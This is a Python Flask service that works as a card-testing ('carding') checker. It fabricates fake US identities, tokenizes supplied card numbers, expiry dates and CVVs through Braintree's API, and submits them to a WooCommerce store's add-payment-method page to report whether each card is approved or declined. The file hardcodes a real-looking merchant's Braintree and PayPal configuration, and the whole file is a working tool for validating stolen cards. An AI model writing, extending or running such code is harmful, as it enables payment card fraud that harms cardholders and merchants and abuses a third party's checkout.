from flask import Flask, request, jsonify
from faker import Faker
import requests
import random
from urllib.parse import urlparse
import json
from lxml import html

app = Flask(__name__)

@app.route('/')
def index():
    return "hi"

fake = Faker("en_US")
domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]

APPROVED = '𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅'
DECLINED = '𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌'
ERROR = '𝙀𝙍𝙍𝙊𝙍 ⚠️'

def fetch_city_zipcode_data():
    url = "https://raw.githubusercontent.com/AbderrezakLzone/country-map/refs/heads/main/US/state.json"
    try:
        response = requests.get(url)

        if response.status_code == 200:
            return response.json()
        else:
            return False
    except requests.exceptions.RequestException as e:
        return False

def generate_random_person():
    city_zipcode_data = fetch_city_zipcode_data()
    if not city_zipcode_data:
        return False

    state_name = random.choice(list(city_zipcode_data.keys()))
    city_name = random.choice(list(city_zipcode_data[state_name].keys()))
    zipcode = city_zipcode_data[state_name][city_name]
    
    phone = fake.phone_number()

    phone = phone.replace("(", "").replace(")", "").replace(" ", "").replace("-", "")
    if phone[:3] != zipcode[:3]:
        phone = f"({zipcode[:3]})-{phone[3:6]}-{phone[6:]}"

    return {
        'firstname': fake.first_name(),
        'lastname': fake.last_name(),
        'username': fake.user_name()[:10],
        'password': fake.password(),
        'email': f"{fake.user_name()[:10]}@{random.choice(domains)}",
        'phone': phone,
        'city': city_name,
        'country': "United States",
        'state': state_name,
        'zipcode': zipcode,
        'address': fake.street_address(),
        'useragent': fake.user_agent(),
    }
    
def get_nonce(cookies, random_person, url):
    url_parse = urlparse(url).netloc
    params = {'_wc_user_reg': "true"}
    headers = {
        'User-Agent': random_person['useragent'],
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': url_parse,
        'referer': url,
    }

    try:
        with requests.Session() as session:
            session.headers.update(headers)
            response = session.post(url, params=params, cookies=cookies, timeout=10).content
            
        tree = html.fromstring(response)
        nonce_value = tree.xpath('//input[@id="woocommerce-add-payment-method-nonce"]/@value')
        print(nonce_value)
        return nonce_value[0] if nonce_value else None
    except requests.Timeout:
        return False
    except Exception as e:
        return False
    
def get_nonce(cookies, random_person, url):
    url_parse = urlparse(url).netloc
    params = {'_wc_user_reg': "true"}
    headers = {
        'User-Agent': random_person['useragent'],
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': url_parse,
        'referer': url,
    }

    try:
        with requests.Session() as session:
            session.headers.update(headers)
            response = session.post(url, params=params, cookies=cookies, timeout=10).content
            
        tree = html.fromstring(response)
        nonce_value = tree.xpath('//input[@id="woocommerce-add-payment-method-nonce"]/@value')
        print(nonce_value)
        return nonce_value[0] if nonce_value else None
    except requests.Timeout:
        return False
    except Exception as e:
        return False
    
def get_token(card, month, year, cvv, random_person, accessTokens):
    headers = {
        'authorization': f'Bearer {accessTokens}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'user-agent': random_person['useragent'],
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': fake.uuid4(),
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': card,
                    'expirationMonth': month,
                    'expirationYear': year,
                    'cvv': cvv,
                    'billingAddress': {
                        'postalCode': random_person['zipcode'],
                        'streetAddress': random_person['state'],
                    },
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    try:
        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        if 'tokencc_b' in response.text:
            data = json.loads(response.text)
            token = data['data']['tokenizeCreditCard']['token']
            return token
        else:
            return False
    except requests.RequestException as e:
        print(f"Failed to get token: {e}")
        return False

def check_card(token, random_person, cookies, nonce, accessToken, url):
    url_parse = urlparse(url).netloc

    headers = {
        'User-Agent': random_person['useragent'],
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': url_parse,
        'referer': url,
    }

    data = {
        'payment_method': "braintree_cc",
        'braintree_cc_nonce_key': token,
        'braintree_cc_device_data': f"{{\"device_session_id\":\"{fake.uuid4()}\",\"fraud_merchant_id\":null,\"correlation_id\":\"{fake.uuid4()}\"}}",
        'braintree_cc_3ds_nonce_key': "",
        'braintree_cc_config_data': f"{{\"environment\":\"production\",\"clientApiUrl\":\"https://api.braintreegateway.com:443/merchants/qkr83g4mw8425xdk/client_api\",\"assetsUrl\":\"https://assets.braintreegateway.com\",\"analytics\":{{\"url\":\"https://client-analytics.braintreegateway.com/qkr83g4mw8425xdk\"}},\"merchantId\":\"qkr83g4mw8425xdk\",\"venmo\":\"off\",\"graphQL\":{{\"url\":\"https://payments.braintree-api.com/graphql\",\"features\":[\"tokenize_credit_cards\"]}},\"braintreeApi\":{{\"accessToken\":\"{accessToken}\",\"url\":\"https://payments.braintree-api.com\"}},\"kount\":{{\"kountMerchantId\":null}},\"challenges\":[\"cvv\",\"postal_code\"],\"creditCards\":{{\"supportedCardTypes\":[\"Discover\",\"JCB\",\"MasterCard\",\"Visa\",\"American Express\",\"UnionPay\"]}},\"threeDSecureEnabled\":false,\"threeDSecure\":null,\"paypalEnabled\":true,\"paypal\":{{\"displayName\":\"Natures Wellness Market L.L.C.\",\"clientId\":\"ATh6OWR1bfwIQ-SIeC2FoX3Vg-NYTPEjNyPsJ9ZfnjVrhi3_dHaR2RqOxEI9aXlzv2gMAlU2nzT3-1_e\",\"privacyUrl\":null,\"userAgreementUrl\":null,\"assetsUrl\":\"https://checkout.paypal.com\",\"environment\":\"live\",\"environmentNoNetwork\":false,\"unvettedMerchant\":false,\"braintreeClientId\":\"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW\",\"billingAgreementsEnabled\":true,\"merchantAccountId\":\"NaturesWellnessMarketLLC_instant\",\"payeeEmail\":null,\"currencyIsoCode\":\"USD\"}}}}",
        'woocommerce-add-payment-method-nonce': nonce,
        '_wp_http_referer': "/my-account/add-payment-method/",
        'woocommerce_add_payment_method': "1"
    }

    try:
        response = requests.post(url, cookies=cookies, headers=headers, data=data).content
        tree = html.fromstring(response)
        success_message = tree.xpath('//div[@class="woocommerce-message" and contains(text(), "Payment method successfully added")]/text()')
        
        if success_message:
            return APPROVED, "Approved"
        else:
            error_message = tree.xpath('//div[@class="woocommerce-MyAccount-content"]//ul[@class="woocommerce-error"]/li/text()')
            if error_message:
                cleaned_message = error_message[0].strip().replace('\n', '').replace('\t', '')
                
                if "Reason: " in cleaned_message:
                    reason = cleaned_message.split("Reason: ", 1)[1].strip()
                    return DECLINED, reason
                else:
                    return DECLINED, cleaned_message
            else:
                return ERROR, "Failed to check the card"

    except Exception as e:
        return False, "UNKNOWN ERROR"

@app.route('/payment', methods=['POST'])
def handle_payment():
    try:
        data = request.get_json()
        
        gateway_config = data.get('gateway_config')
        if not gateway_config:
            return jsonify({"status": ERROR, "result": "Gateway configuration is missing"}), 400
        
        random_person = generate_random_person()
        if not random_person:
            return jsonify({"status": ERROR, "result": "Failed to generate random person"}), 400
        
        cookies = gateway_config.get("cookies")
        if not cookies:
            return jsonify({"status": ERROR, "result": "Cookies are missing in gateway config"}), 400
        
        cookies_dict = {cookie["name"]: cookie["value"] for cookie in gateway_config["cookies"]}

        url = gateway_config.get("url")
        if not url:
            return jsonify({"status": ERROR, "result": "url are missing in gateway config"}), 400
        
        card_info = data.get('card')
        if not card_info:
            return jsonify({"status": ERROR, "result": "Card information is missing"}), 400

        card_number = card_info.get("number")
        if not card_number:
            return jsonify({"status": ERROR, "result": "Card number is missing in card info"}), 400

        month = card_info.get("month")
        if not month:
            return jsonify({"status": ERROR, "result": "month is missing in card info"}), 400

        year = card_info.get("year")
        if not year:
            return jsonify({"status": ERROR, "result": "year is missing in card info"}), 400

        cvv = card_info.get("cvv")
        if not cvv:
            return jsonify({"status": ERROR, "result": "cvv is missing in card info"}), 400
        
        nonce = get_nonce(cookies_dict, random_person, url)
        if not nonce:
            return jsonify({"status": ERROR, "result": "Failed to fetch nonce"}), 400

        accessToken = gateway_config.get("access_token")
        if not accessToken:
            return jsonify({"status": ERROR, "result": "accessTokens are missing in gateway config"}), 400

        token = get_token(card_number, month, year, cvv, random_person, accessToken)
        if not token:
            return jsonify({"status": ERROR, "result": "Failed to fetch token"}), 400

        status, result = check_card(token, random_person, cookies_dict, nonce, accessToken, url)
        if not status:
            return jsonify({"status": ERROR, "result": result}), 400

        return jsonify({
            "status": status,
            "result": result,

        }), 200
        
    except Exception as e:
        return jsonify({
            "status": ERROR,
            "result": str(e)
        }), 500

if __name__ == '__main__':
    app.run(debug=True)
